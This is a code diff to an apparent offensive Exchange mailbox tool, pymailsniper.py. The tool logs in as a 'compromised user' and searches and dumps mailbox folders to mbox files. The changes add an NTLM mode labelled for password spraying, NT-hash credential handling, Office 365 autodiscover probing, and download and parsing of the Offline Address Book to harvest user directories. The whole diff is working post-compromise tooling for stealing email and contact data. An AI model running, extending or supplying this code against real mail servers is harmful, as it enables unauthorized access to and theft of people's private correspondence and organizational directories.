@@ -2,7 +2,7 @@
 import re
 import socket
 from exchangelib import Account, Credentials, Configuration, DELEGATE, Folder, FileAttachment, BaseProtocol, \
-    NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList
+    NoVerifyHTTPAdapter, Message, Q, FaultTolerance, DistributionList, NTLM
 from exchangelib.errors import UnauthorizedError, CASError
 from requests.auth import HTTPBasicAuth
 import shutil
@@ -69,11 +69,18 @@ def acctSetup(params):
     email = params.get('email')
     password = params.get('password')
     shared = params.get('delegated')
+    do_ntlm = params.get('ntlm')
 
+    # TODO: delete NTLM
     try:
-        config = Configuration(
-            server=server, credentials=Credentials(email, password), retry_policy=FaultTolerance(max_wait=3),
-            max_connections=2)
+        if do_ntlm:
+            config = Configuration(
+                server=server, credentials=Credentials(email, password), retry_policy=FaultTolerance(max_wait=3),
+                max_connections=2, auth_type=NTLM)
+        else:
+            config = Configuration(
+                server=server, credentials=Credentials(email, password), retry_policy=FaultTolerance(max_wait=3),
+                max_connections=2)
 
         # TODO:
         # understand this
@@ -208,7 +215,6 @@ def search_emails(accountObject=None, params=None):
     user_folder = params.get('user_folder')
 
     # if we want to dump searching results we
-
     if len(terms) > 1:
         termList = terms.split(',')
     elif type(terms) == list:
@@ -225,32 +231,37 @@ def search_emails(accountObject=None, params=None):
     elif search_folder.lower() == "sent":
         all_folders = [accountObject.sent]
     elif search_folder.lower() == "all":
-        all_folders = get_all_subfolders(accountObject.msg_folder_root)
-        # skipping calendar and contacts because there is no email objects there
-        bad_folders = get_all_subfolders(accountObject.contacts) + get_all_subfolders(accountObject.calendar)
-        all_folders = [folder for folder in all_folders if folder not in bad_folders]
+        all_folders = [accountObject.msg_folder_root]
+        args['recurse'] = True
+
     else:
         # including base folder (where we are searching for subfolders)
         all_folders = [find_Folder(accountObject=accountObject, folder_to_find=search_folder)]
-        if params.get('recurse'):
-            all_folders += get_all_subfolders(all_folders[0])
         if not all_folders[0]:
             print(f"\n[-] Folder {search_folder} not found")
             return 1
 
+    if params.get('recurse'):
+        all_folders = get_all_subfolders(all_folders[0])
+
+    # skipping calendar and contacts because there is no email objects there
+    bad_folders = get_all_subfolders(accountObject.contacts) + get_all_subfolders(accountObject.calendar)
+    all_folders = [folder for folder in all_folders if folder not in bad_folders]
+
     if params.get('dump'):
-        mbox_output = params.get('user_folder')
         storage_pattern = datetime.datetime.today().strftime(
-            f'Search {search_folder} ({"".join(termList)}) %Y-%m-%d %H-%M')
+            f'Search {search_folder} ({",".join(termList)}) %Y-%m-%d %H-%M')
 
         # if we are dumping all or we have more than 1 folder, we make dir for a lot of mboxes
-        if search_folder.lower() == 'all' or len(all_folders) > 1:
-            mbox_output = f"./{mbox_output}/" + storage_pattern
+        if len(all_folders) > 1:  # search_folder.lower() == 'all':
+            # if we are dumping more than one folder, we creating subfolder
+            # for results
+            mbox_output = f"./{user_folder}/{storage_pattern}"
             os.mkdir(mbox_output)
             print(f"\n[+] Folder \"{mbox_output}\" created\n")
         else:
             # if we searching in and dumping one folder - we just creating .mbox file in user folder
-            mbox_output = f'{mbox_output}/{storage_pattern}.mbox'
+            mbox_output = f'./{user_folder}/{storage_pattern}.mbox'
 
     search_logfile = f'{user_folder}/{storage_pattern}.txt'
     writer = open(search_logfile, 'w', encoding='utf-8')
@@ -262,10 +273,12 @@ def search_emails(accountObject=None, params=None):
         if folder.total_count == 0:
             continue
 
+        """ where to search """
+
         if where_to_search == 'body':
-            print('[+] Searching Email body for {} in "{}" Folder [+]'.format(terms, folder.name))
+            print('[+] Searching Email body for {} in "{}" Folder'.format(terms, folder.name))
         elif where_to_search == 'subject':
-            print('[+] Searching Email Subject for {} in "{}" Folder [+]'.format(terms, folder.name))
+            print('[+] Searching Email Subject for {} in "{}" Folder'.format(terms, folder.name))
 
         # just a query what will be modified later when we chose where to search (body or subject)
         emails_for_search = folder.all().order_by('-datetime_received').values_list('id', 'changekey')
@@ -302,10 +315,6 @@ def search_emails(accountObject=None, params=None):
         for email in found_emails_data:
             if not isinstance(email, Message):
                 continue
-            # TODO:
-            #  if --dump mode
-            #  ignore filtering
-            #  by not adding to already_found_substrings
 
             # just removes \r, replacing \n to \\n and \S+ to " " (space)
             clear_message_text_body = sanitise_message_text_body(email.text_body)
@@ -320,7 +329,9 @@ def search_emails(accountObject=None, params=None):
 
             try:
                 if where_to_search == 'body':
-                    # searching by regex ((\S+)?.{0,50}(term1|term2|term3).{0,50}(\S+)?), returns up to 50 chars + word before and after terms
+                    # searching in message text by regex
+                    # ((\S+)?.{0,50}(term1|term2|term3).{0,50}(\S+)?)
+                    # returns up to 50 chars + word before and after terms
                     regex = '((\S+)?.{0,50}(' + "|".join(termList) + ').{0,50}(\S+)?)'
 
                     # searching with ignoring case and getting a list of substrings found by regex
@@ -358,12 +369,17 @@ def search_emails(accountObject=None, params=None):
                 print("[!] Exception while searching: ")
                 print(e)
 
+        # if we are dumping more than one folder and we found something
         if params.get('dump') and len(found_checked_emails_IDs) != 0:
-            if search_folder.lower() == 'all' or len(all_folders) > 1:
+            if len(all_folders) > 1:  # search_folder.lower() == 'all' or :
                 # Okay, don't try to understand bellow line, it works fine
                 mbox_filename = f"{''.join(['[' + parent + '] ' for parent in folder.parent.absolute.replace(accountObject.msg_folder_root.absolute + '/', '').split('/')])} {folder.name}" if folder.parent.absolute != accountObject.msg_folder_root.absolute else f"{folder.name}"
                 mbox_filename = sanitise_filename(mbox_filename)
                 mbox_full_path = mbox_output + '/' + mbox_filename + '.mbox'
+            elif len(all_folders) == 1:
+                mbox_full_path = mbox_output
+            else:
+                print("WTF" * 160)
 
             get_tqdm_description = f"Downloading search results for \"{folder.name}\" folder"
             dump_tqdm_description = f"[+] Saving found in \"{folder.name}\" folder to {mbox_full_path}"
@@ -383,7 +399,7 @@ def proxy_check(params=None):
     a_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     proxy = re.search(r'\w+?://([A-Za-z_0-9\.-]+):(\d+)', params.get('proxy'))
-    proxy_addr = proxy.group(1)
+    proxy_addr: str = proxy.group(1)
     proxy_port = int(proxy.group(2))
 
     location = (proxy_addr, proxy_port)
@@ -495,7 +511,7 @@ def list_contacts(accountObject=None, params=None):
         print(all_addresses)
 
     else:
-        print("\n[+] AllContacts")
+        print("\n[+] AllContacts\n")
         folder = accountObject.root / 'AllContacts'
         for person in folder.people():
             emails = "".join([email.email_address + '\n' for email in person.email_addresses])[
@@ -533,6 +549,7 @@ def list_contacts(accountObject=None, params=None):
     print()
 
 
+# TODO: check this
 # This is where we check if the address list file provided exists
 def file_parser(params):
     return_dict = {}
@@ -605,7 +622,8 @@ def dump_to_Mbox(folder_name=None, mbox_file_path=None, mimes_list=[], tqdm_desc
         if folder_name:
             print("[+] Dumped folder\t{:25s} {:18s}".format('"' + folder_name + '"', info))
         else:
-            print("[+] Dumped to {} {:>18}".format(mbox_file_path, info))
+            # kostil'
+            print("[+] Dumped to {} {:>18}".format(re.sub('\S+' + args['user_folder'] + '/', '', mbox_file_path), info))
 
 
 def dump_thread_worker(accountObject=None, folder_name=None, thread_index=None, params=None,
@@ -666,14 +684,17 @@ def dump_folders(accountObject=None, params=None):
     elif folder_to_dump.lower() == "sent":
         base_folder = accountObject.sent
     elif folder_to_dump.lower() == "all":
-        base_folder = accountObject.msg_folder_root
+        base_folder = [accountObject.msg_folder_root]
+        params['recurse'] = True
     else:
-        base_folder = find_Folder(accountObject=accountObject, folder_to_find=folder_to_dump)
-        if params.get('recurse'):
-            base_folder += get_all_subfolders(base_folder[0])
+        base_folder = [find_Folder(accountObject=accountObject, folder_to_find=folder_to_dump)]
         if not base_folder:
             print(f"\n[-] Folder {local_folder} not found")
             return 1
+
+    # if we want -r, well get all subfolders
+    if params.get('recurse'):
+        base_folder = get_all_subfolders(base_folder[0])
 
     if os.path.isdir(local_folder):
         print(f"\n[-] Folder {local_folder} already exists, use another (-d)")
@@ -687,17 +708,18 @@ def dump_folders(accountObject=None, params=None):
             print(e)
             return 1
 
-    all_folders_2_dump = get_all_subfolders(base_folder)
+    all_folders_2_dump = base_folder
 
     # filter for useless folders
     bad_folders = get_all_subfolders(accountObject.calendar) + get_all_subfolders(accountObject.contacts)
     all_folders_2_dump = [folder for folder in all_folders_2_dump if
                           folder not in bad_folders]
 
+    # skipping empty folders
+    all_folders_2_dump = [folder for folder in all_folders_2_dump if folder.total_count != 0]
+
     for folder in all_folders_2_dump:
         # If no messages in folder going next:
-        if folder.total_count == 0:
-            continue
 
         global messages_per_thread
 
@@ -742,7 +764,7 @@ def dump_folders(accountObject=None, params=None):
             # one connection per thread
             if len(items_per_thread[index]) == 0:
                 continue
-            accountObjects[index] = acctSetup(parsed_arguments)
+            accountObjects[index] = acctSetup(args)
             t = threading.Thread(target=dump_thread_worker,
                                  kwargs={'accountObject': accountObjects[index],
                                          'email_ids_to_download': items_per_thread[index],
@@ -772,13 +794,15 @@ def get_autodiscover(params=None):
     password = params.get('password')
 
     # Auths
-    auths = {'Basic': HTTPBasicAuth, 'NTLM': HttpNtlmAuth}
+    auths = {'NTLM': HttpNtlmAuth, 'Basic': HTTPBasicAuth}
+    if re.match(r'^[a-fA-F\d]{32}:[a-fA-F\d]{32}$', password):
+        del auths['Basic']
 
     autodiscover_urls = []
     a = server.split('.')
     autodiscover_urls += ['autodiscover.' + server[server.index(a[i]):] for i in range(len(a) - 1)]
     autodiscover_urls += [server[server.index(a[i]):] for i in range(len(a) - 1)]
-
+    autodiscover_urls += ['outlook.office365.com']
     autodiscover_request_body = f"""
                 <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
                 <Request>
@@ -809,13 +833,18 @@ def get_autodiscover(params=None):
     print()
 
     autodiscover_urls = checked_urls
-    # first we trying https for secure
+    try:
+        autodiscover_urls.remove('office365.com')
+    except:
+        pass
+    # first we trying https for and ntlm for secure
     for method in ["https://", "http://"]:
+
         for url in autodiscover_urls:
-
-            headers = {"Host": url, 'User-Agent': params.get('user_agent'), 'Content-Type': 'text/xml'}
-
             for auth_key, auth_type in auths.items():
+                headers = {'User-Agent': params.get('user_agent'),
+                           'Content-Type': 'text/xml'}
+
                 try:
                     full_url = f'{method}{url}/autodiscover/autodiscover.xml'
 
@@ -824,23 +853,41 @@ def get_autodiscover(params=None):
                     session.verify = False
                     session.trust_env = True
 
-                    redirect_check = session.get(full_url, allow_redirects=False, timeout=1)
+                    redirect_check = session.get(full_url, allow_redirects=False, timeout=1, headers=headers)
+
+                    if redirect_check.status_code == 404:
+                        continue
+
                     if redirect_check.status_code == 302:
                         print(f"\n[!] Redirected from {full_url}\n to {redirect_check.next.url} ( {auth_key} auth )\n")
                         full_url = redirect_check.next.url
-                    del redirect_check
-                    response = session.post(full_url,
-                                            data=autodiscover_request_body, headers=headers,
-                                            timeout=1)
+                        del redirect_check
+
+                    response = session.post(full_url, data=autodiscover_request_body, headers=headers, timeout=1)
+
+                    if response.status_code == 401:
+                        print(
+                            f"[-] 401 - Failed to authorise at {full_url} ( {auth_key} auth )\n    (check manually why if creds are correct)")
+                        continue
+
                     if response.status_code != 200 or len(response.text) == 0:
                         continue
-                    print(f"[+] Got valid autodiscover answer from {full_url} ( {auth_key} auth )")
+                    print(f"\n[+] Got VALID autodiscover answer from {full_url} ( {auth_key} auth )")
                     file = f"{params.get('user_folder')}/autodiscover.xml"
                     with open(file, 'w', encoding='utf8') as writer:
                         writer.write(response.text)
+
+                    regex = '(?<=(<ewsurl>))http(s)?://([^/]+)(?=(\S+</EwsUrl>))'
+                    servers = list(set([result[2] for result in re.findall(regex, response.text, re.IGNORECASE)]))
+                    print('\n[!] Your servers are:')
+                    for index, ews_server in enumerate(servers):
+                        print("{:>5s}.\t{}".format(str(index), ews_server))
+                    print()
+
                     return response.text
-                except:
+                except Exception as e:
                     print(f"[-] Could not get {full_url} ( {auth_key} auth )")
+                    # print(e)
 
 
 def get_args():
@@ -848,7 +895,7 @@ def get_args():
                                      usage='python3 pymailsniper.py -s mail.server.com -e email@email.com action object [action options]')
 
     parser.add_argument('-s', '--server', action="store",
-                        dest="server", help='EWS URL for Mail Server')
+                        dest="server", help='Server which contains EWS (Example - outlook.com)')
     parser.add_argument('-e', '--email', action="store",
                         dest="email", help='Email address of compromised user')
     parser.add_argument('-p', '--password', action="store",
@@ -856,7 +903,8 @@ def get_args():
     parser.add_argument('--proxy', action="store", help="Example: socks5://127.0.0.1:9150")
     parser.add_argument('-ua', '--user-agent', action="store", help="User agent",
                         default='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0')
-
+    parser.add_argument('-nt', '--ntlm', action='store_true', default=False,
+                        help='Use NTLM authentication, use for password spray')
     # subparsers init
     subparsers = parser.add_subparsers(title='action', dest='action')
     # subparsers init
@@ -865,7 +913,7 @@ def get_args():
     dump_subparser = subparsers.add_parser('dump', help='perform downloading of objects', add_help=True)
     get_subparser = subparsers.add_parser('get', help='perform downloading of objects', add_help=True)
 
-    get_subparser.add_argument('object', choices=['autodiscover', 'oab'], type=str)
+    get_subparser.add_argument('object', choices=['autodiscover', 'lzx'], type=str)
 
     # list action subparser args
     list_subparser.add_argument('-a', '--absolute', action='store_true', default=False,
@@ -878,9 +926,10 @@ def get_args():
                                 help='Contacts - Use GAL instead of "AllAccount" folder')
     list_subparser.add_argument('-v', '--verbose', action='store_true', default=False,
                                 help='Contacts - Print additional info about contacts')
-    list_subparser.add_argument('object', choices=['folders', 'emails', 'contacts'], type=str)
+    list_subparser.add_argument('-oab', '--oab', action='store', default=None,
+                                help='OAB file location (Not .lzx!!!)')
+    list_subparser.add_argument('object', choices=['folders', 'emails', 'contacts', 'oab'], type=str)
 
-    #
     # dump action subparser args
     dump_subparser.add_argument('-d', '--dump', action='store',
                                 default=datetime.datetime.today().strftime('Dump %Y-%m-%d %H-%M'),
@@ -917,22 +966,34 @@ def get_args():
         parser.print_help()
         sys.exit()
 
-    args = parser.parse_args()
+    args = vars(parser.parse_args())
+    if not args['action']:
+        parser.print_help()
+        sys.exit()
     return args
 
 
-def get_oab_file(params=None):
-    server = params.get('server').replace("https://", "").replace("http://", "")
+# Function for finding and downloading compressed OAB (.lzx)
+def get_lzx_file(params=None):
+    # server = params.get('server').replace("https://", "").replace("http://", "")
     email = params.get('email')
     password = params.get('password')
     autodiscover_file = f'{params.get("user_folder")}/autodiscover.xml'
+
+    headers = {'User-Agent': params.get('user_agent')}
+
     if isfile(autodiscover_file):
         with open(autodiscover_file, 'r', encoding='utf8') as reader:
             autodiscover = reader.read()
     else:
         autodiscover = get_autodiscover(params=params)
+        if not autodiscover:
+            print('\n[-] Didn\'t found autodiscover, exiting')
+            return
 
-    auths = {'Basic': HTTPBasicAuth, 'NTLM': HttpNtlmAuth}
+    auths = {'NTLM': HttpNtlmAuth, 'Basic': HTTPBasicAuth}
+    if re.match(r'^[a-fA-F\d]{32}:[a-fA-F\d]{32}$', password):
+        del auths['Basic']
 
     regex = r'<OABUrl>(http.*)</OABUrl>'
     oab_urls = re.findall(regex, autodiscover, re.IGNORECASE)
@@ -941,34 +1002,110 @@ def get_oab_file(params=None):
     print()
     for oab_url in oab_urls:
         print(f"[+] Found oab url: {oab_url}oab.xml")
-
+    print()
+    # first, checking NTLM auth, then Basic
     for auth_key, auth_type in auths.items():
+        # Creating session
         session = requests.Session()
         session.auth = auth_type(email, password)
 
         session.verify = False
         session.trust_env = True
-
+        # going throughout oab urls from autodiscover
         for oab_url in oab_urls:
             try:
-                response = session.get(oab_url + 'oab.xml')
+                # opening lzx url and looking for file to download
+                response = session.get(oab_url + 'oab.xml', headers=headers)
                 found = re.search(r'>(.+lzx)<', response.text)
 
                 if found:
                     lzx_filename = found.group(1)
+
                     print(f"[+] Found lzx url: {oab_url + lzx_filename}")
+
                     lzx_url = oab_url + lzx_filename
+
+                    # trying to download file
                     lzx_response = session.get(lzx_url, stream=True, verify=False)
+
                     if lzx_response.status_code == 200:
                         with open(f'{params.get("user_folder")}/{lzx_filename}', 'wb') as f:
                             lzx_response.raw.decode_content = True
                             shutil.copyfileobj(lzx_response.raw, f)
-                            print(f'[+] Saved to: "./{params.get("user_folder")}/{lzx_filename}"\n')
+
+                        print(f'\n[+] Saved to: "./{params.get("user_folder")}/{lzx_filename}"')
+                        print('\n[!] You can use oabextract tool to get oab from lzx file')
+                        # print('\n[!] Place it here for using "list oab"')
+                        print(
+                            '\n[!] Download: https://github.com/bsrinivasguptha/LzxToOabComplied/blob/master/Release.zip\n')
+
                         return
                     else:
-                        print(f"[!] Could not get: {lzx_url}\n ( {auth_key} Auth )")
-            except:
-                print(f"[!] Could not get: {oab_url}\n")
+                        print(f"[!] Could not get: {lzx_url} ( {auth_key} Auth )\n")
+            except Exception as e:
+                print(f"[!] Could not get: {oab_url} ( {auth_key} Auth )\n")
+
+    print(f"[!] Could not anything, try without server\n")
+    return
+
+
+def list_oab(params=None):
+    autodiscover_file = f'{params.get("user_folder")}/autodiscover.xml'
+    if isfile(autodiscover_file):
+        with open(autodiscover_file, 'r', encoding='utf8') as reader:
+            autodiscover = reader.read()
+    else:
+        autodiscover = get_autodiscover(params=params)
+
+    """Searching delimiter in autodiscover"""
+
+    splitter_regex = '(<LegacyDN>)(.*/cn=Recipients)'
+    try:
+        delimiter = re.search(splitter_regex, autodiscover)
+        delimiter = delimiter.group(2).encode('utf8')
+    except Exception as e:
+        print("[!] Exception - Could not find LegacyDN in autodiscover\n")
+        print(e)
+
+    oab_file = params.get('oab')
+
+    # read in file
+    with open(oab_file, "rb") as reader:
+        content = reader.read()
+
+    # this parser code is pretty shitty BUT
+    # when i was looking for any solutions
+    # i did not found anything better than just using 'strings' tool
+    # i stared at microsoft documentation, compared byte by byte of mine oabs and docs examples
+    # in hex editor to write normal parser BUT
+    # I COULDN'T soooo....
+    # ANY CORRECTIONS ARE WELCOME
+
+    # first part is garbage (exif, magic bytes and so on)
+    user_list = content.split(delimiter)[1:]
+
+    # in oab we have text fields which contains string with NULL byte at the end
+    # so we trying to split fields (i am not sure is it utf8 everytime)
+    user_list = [user.split(b'\x00') for user in user_list]
+
+    for user_index in range(len(user_list)):
+        # first we converting every printable bytes printable to strings
+        user_list[user_index] = [field.decode('utf8', errors='replace') for field in user_list[user_index]]
+        # then cutting out small fields shorter than 3 chars
+        user_list[user_index] = [field for field in user_list[user_index] if field != "" and 3 < len(field)]
+
+    file = f"{params.get('user_folder')}/parsed_oab.txt"
+    writer = open(file, 'w', encoding='utf8')
+    for user in range(len(user_list)):
+        for field in range(len(user_list[user])):
+            writer.write(str(field) + '\t')
+            writer.write(user_list[user][field])
+            writer.write('\n')
+        writer.write('\n')
+
+    print(f"[!] OAB parsed to {file}\n")
+    print("\n[!] Please do commits for this parser to get less UGLY results")
+
     return
 
 
@@ -981,25 +1118,6 @@ if __name__ == "__main__":
     print(banner)
 
     # TODO: CLEAR THIS SHIT AND ADD DEBUG MODE
-    # search_subparser.add_argument('--delegated', action="store",
-    #                               dest="delegated", help='Mailbox with access')
-
-    #
-    # list emails init
-    # not implemented yet
-    # emails_parser = subparsers.add_parser('emails', add_help=False, parents=[list_parser])
-    #
-    # list contacts init
-    # contacts_parser = subparsers.add_parser('contacts', add_help=False, parents=[list_parser])
-    #
-    # list_parser = subparsers.add_parser('list', help='List: folders, emails, contacts', parents=[optional_parser])
-    #
-    # dump_parser = subparsers.add_parser(
-    #     'dump', help="Download emails", parents=[optional_parser])
-    # dump_parser.add_argument('folder', action='store', default="Inbox",
-    #                          help='Folder to dump')
-
-    #
     # attach_parser = subparsers.add_parser(
     #     'attachment', help="List/Download Attachments", parents=[optional_parser])
     # attach_parser.add_argument('-d', '--directory', action="store",
@@ -1025,17 +1143,16 @@ if __name__ == "__main__":
 
     args = get_args()
 
-    parsed_arguments = vars(args)  # Convert Args to a Dictionary
+    BaseProtocol.USERAGENT = args['user_agent']
 
-    BaseProtocol.USERAGENT = args.user_agent
     # proxy stuff
-    if args.proxy:
-        if not proxy_check(params=parsed_arguments):
+    if args['proxy']:
+        if not proxy_check(params=args):
             print("\n[!] Proxy is down, exiting\n")
             sys.exit()
         else:
-            print(f'\nProxy {args.proxy} looks okay, setting env variables and adapter\n')
-            proxy = args.proxy
+            print(f'\nProxy {args["proxy"]} looks okay, setting env variables and adapter\n')
+            proxy = args['proxy']
             if proxy:
                 try:
                     del os.environ['HTTP_PROXY']
@@ -1047,36 +1164,56 @@ if __name__ == "__main__":
                 BaseProtocol.HTTP_ADAPTER_CLS = MyProxyAdapter
     else:
         BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter
-    print(f"[+] Email - {args.email}, server - {args.server}")
 
-    #
-    if not args.password:
-        args.password = getpass.getpass(prompt='Password: ', stream=None)
+    action = args['action']
+    action_object = args['object']
 
+    args['user_folder'] = create_user_folder(params=args)
+
+    print(f"[+] Email - {args['email']}, server - {args['server']}")
+
+    if action == 'list' and args['object'] == 'oab':
+        if not args['email']:
+            print('\n[!] Please, specify -e --email\n')
+        if args['oab']:
+            list_oab(params=args)
+        else:
+            print("\n[!] Please specify -oab argument\n")
+
+        sys.exit()
+
+    # secure input if password is missing
+    if not args['password']:
+        args['password'] = getpass.getpass(prompt='Password: ', stream=None)
+
+    # TODO: understand that
     # if parsed_arguments.get("galList"):
     #     fileparser = file_parser(parsed_arguments)
 
     # if parsed_arguments.get("output"):
     #     loghandle = loggerCreate(parsed_arguments)
 
-    action = parsed_arguments['action']
-    action_object = parsed_arguments['object']
-
-    parsed_arguments['user_folder'] = create_user_folder(params=parsed_arguments)
-
+    # here are option which do not require connection via exchangelib
     if action == 'get':
-        if parsed_arguments['object'] == 'autodiscover':
-            answer = get_autodiscover(params=parsed_arguments)
+        if args['object'] == 'autodiscover':
+            # TODO: ask if .xml file exist already
+            answer = get_autodiscover(params=args)
             if answer:
-                print(f"\n[=] Saved to \"./{parsed_arguments.get('user_folder')}/autodiscover.xml\"\n")
+                print(f"\n[=] Saved to \"./{args['user_folder']}/autodiscover.xml\"\n")
             else:
                 print(f"\n[!] Nothing found")
+                if args['server']:
+                    print('\n[!] Try again without -s !\n')
             sys.exit()
-        elif parsed_arguments['object'] == 'oab':
-            get_oab_file(params=parsed_arguments)
+        elif args['object'] == 'lzx':
+            get_lzx_file(params=args)
             sys.exit()
 
-    accountObj = acctSetup(parsed_arguments)
+    if not args['server']:
+        print('\n[!] Please specify server! Exiting.\n')
+        sys.exit()
+
+    accountObj = acctSetup(args)
 
     if accountObj is None:
         print('[=] Could not connect to MailBox\n\n')
@@ -1088,21 +1225,22 @@ if __name__ == "__main__":
         if action_object == 'emails':
             print('NOT IMPLEMENTED YET!')
         if action_object == 'contacts':
-            list_contacts(accountObject=accountObj, params=parsed_arguments)
+            list_contacts(accountObject=accountObj, params=args)
         if action_object == 'folders':
-            list_folders(accountObject=accountObj, params=parsed_arguments)
+            list_folders(accountObject=accountObj, params=args)
     elif action == 'dump':
+        # TODO: implement "dump all"
         if action_object == 'emails':
             # alias for "dump folder"
-            dump_folders(accountObj, params=parsed_arguments)
+            dump_folders(accountObj, params=args)
         if action_object == 'contacts':
             print('NOT IMPLEMENTED YET!')
         if action_object == 'folders':
-            dump_folders(accountObj, params=parsed_arguments)
+            dump_folders(accountObj, params=args)
 
     elif action == 'search':
         if action_object == 'emails':
-            search_emails(accountObj, parsed_arguments)
+            search_emails(accountObj, args)
         if action_object == 'contacts':
             print('NOT IMPLEMENTED YET!')
         if action_object == 'folders':
@@ -1113,11 +1251,10 @@ if __name__ == "__main__":
     #     searchAttachments(accountObj, parsed_arguments)
     # elif parsed_arguments['modules'] == 'delegation':
     #     searchDelegates(parsed_arguments, fileparser)
-    try:
-        del os.environ['HTTP_PROXY']
-        del os.environ['HTTPS_PROXY']
-    except:
-        pass
+    if args['proxy']:
+        try:
+            del os.environ['HTTP_PROXY']
+            del os.environ['HTTPS_PROXY']
+        except:
+            pass
     print("[=] Took time: {:.3f} min\n\n".format((time.time() - start_time) / 60))
-
-    # to-do get file sizes
